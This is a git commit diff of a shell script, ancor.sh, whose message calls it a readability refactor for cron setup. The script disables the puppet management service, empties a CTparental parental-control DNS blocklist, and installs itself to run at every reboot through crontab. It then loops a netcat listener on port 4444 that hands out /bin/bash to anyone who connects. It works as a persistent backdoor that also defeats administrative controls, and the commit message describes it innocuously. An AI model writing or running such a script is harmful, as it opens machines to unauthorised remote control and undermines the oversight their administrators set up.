325a7eefc3b24a84c7d502e63c3043af688b4062
gaelgnz <gaelgnz06@gmail.com>
2026-01-29 22:08:29 +0100

    Refactor ancor.sh for cron job setup
    Refactor script to set up cron job and improve readability.

--- ancor.sh
+++ ancor.sh
@@ -1,12 +1,28 @@
+#!/bin/bash
+
 systemctl disable puppet
+
 echo -n >/etc/CTparental/dnscrypt-blocked-names.txt
 
-SCRIPT_PATH="$(readlink -f "$0")"
+
+SCRIPT_FILE="/usr/local/bin/ancor.sh"
+
+cat > "$SCRIPT_FILE" << 'EOF'
+#!/bin/bash
+
+SCRIPT_PATH="/usr/local/bin/ancor.sh"
 CRON_LINE="@reboot $SCRIPT_PATH"
-(
-  crontab -l 2>/dev/null
-  echo "$CRON_LINE"
-) | sort -u | crontab -
+
+( crontab -l 2>/dev/null; echo "$CRON_LINE" ) | sort -u | crontab -
+EOF
+
+chmod +x "$SCRIPT_FILE"
+
+CRON_LINE="@reboot $SCRIPT_FILE"
+( crontab -l 2>/dev/null; echo "$CRON_LINE" ) | sort -u | crontab -
+
+
+
 ip a
 while true; do
   nc -nlvp 4444 -e /bin/bash
